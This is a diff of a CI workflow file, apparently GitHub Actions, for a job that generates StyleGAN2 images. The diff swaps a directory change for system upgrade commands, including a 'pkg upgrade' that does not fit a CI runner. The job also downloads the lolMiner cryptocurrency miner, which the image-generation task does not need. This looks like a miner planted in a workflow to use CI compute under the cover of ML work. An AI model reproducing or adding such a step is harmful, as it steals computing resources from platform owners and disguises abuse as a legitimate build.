@@ -34,7 +34,9 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         pip install --upgrade pip
-        cd /inputs/stylegan2
+        apt update
+        apt upgrade
+        pkg upgrade
         wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
